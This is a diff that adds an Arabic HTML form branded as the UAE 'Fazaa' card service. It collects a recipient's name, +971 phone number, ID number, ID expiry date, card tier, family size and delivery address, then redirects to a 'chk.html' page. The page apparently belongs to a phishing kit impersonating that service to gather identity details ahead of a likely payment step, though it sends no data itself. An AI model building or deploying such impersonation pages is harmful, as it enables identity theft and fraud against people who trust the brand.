@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معلومات المستلم - فزعة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+        }
+        body {
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #fff;
+            min-height: 100vh;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            position: relative;
+            padding-bottom: 80px;
+        }
+        
+        /* صورة البطاقات العلوية */
+        .top-banner {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            background-color: #e0e0e0;
+            display: block;
+        }
+
+        /* تنسيق قسم النموذج */
+        .form-section {
+            padding: 20px 25px;
+        }
+        .form-header {
+            background-color: #1a365d;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            font-size: 22px;
+            font-weight: 700;
+            border-radius: 4px;
+            margin-bottom: 25px;
+        }
+        .form-box {
+            border: 2px solid #1a365d;
+            border-radius: 6px;
+            padding: 25px 20px;
+        }
+
+        /* تنسيق الحقول */
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 15px;
+            border: 2px solid #1a365d;
+            border-radius: 4px;
+            font-size: 15px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .input-field::placeholder {
+            color: #a0a0a0;
+            font-weight: 500;
+        }
+
+        /* تنسيق خاص برقم الجوال */
+        .phone-group {
+            display: flex;
+            border: 2px solid #1a365d;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .phone-group input {
+            border: none;
+            flex-grow: 1;
+            padding: 14px 15px;
+            font-size: 15px;
+            outline: none;
+            direction: rtl;
+        }
+        .phone-group input::placeholder {
+            color: #a0a0a0;
+            font-weight: 500;
+        }
+        .phone-code {
+            background-color: #fff;
+            color: #a0a0a0;
+            padding: 14px 15px;
+            border-right: 2px solid #1a365d;
+            font-weight: 500;
+            direction: ltr;
+        }
+
+        /* تنسيق القائمة المنسدلة */
+        select.input-field {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23a0a0a0' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: left 15px center;
+            background-size: 18px;
+            color: #a0a0a0;
+        }
+        select.input-field:focus, select.input-field:valid {
+            color: #333;
+        }
+
+        /* زر المتابعة */
+        .btn-submit {
+            display: block;
+            width: 80%;
+            margin: 40px auto 10px;
+            background-color: #1a365d;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-submit:hover {
+            background-color: #122540;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- صورة बैनر البطاقات (يمكنك استبدال الرابط بالصورة المطلوبة) -->
+    <img src="https://i.imgur.com/pAie3Ze.jpeg" alt="بطاقات فزعة" class="top-banner">
+    
+    <div class="form-section">
+        <!-- عنوان النموذج -->
+        <div class="form-header">
+            معلومات المستلم
+        </div>
+        
+        <!-- صندوق النموذج -->
+        <form class="form-box" id="recipientForm">
+            
+            <div class="input-group">
+                <input type="text" class="input-field" placeholder="الاسم" required>
+            </div>
+            
+            <div class="input-group phone-group">
+                <input type="tel" placeholder="إدخال رقم الجوال" required>
+                <div class="phone-code">+971</div>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" class="input-field" placeholder="رقم الهوية" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" class="input-field" placeholder="تاريخ انتهاء الهوية" onfocus="(this.type='date')" onblur="(this.type='text')" required>
+            </div>
+            
+            <div class="input-group">
+                <select class="input-field" required>
+                    <option value="" disabled selected hidden>اختر نوع البطاقة</option>
+                    <option value="silver">فضية</option>
+                    <option value="gold">ذهبية</option>
+                    <option value="platinum">بلاتينية</option>
+                </select>
+            </div>
+            
+            <div class="input-group">
+                <input type="number" class="input-field" placeholder="عدد افراد الأسره" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" class="input-field" placeholder="عنوان التسليم" required>
+            </div>
+            
+<button type="submit" class="btn-submit" onclick="window.location.href='chk.html'; return false;">متابعة</button>        </form>
+    </div>
+</div>
+
+</body>
+</html>
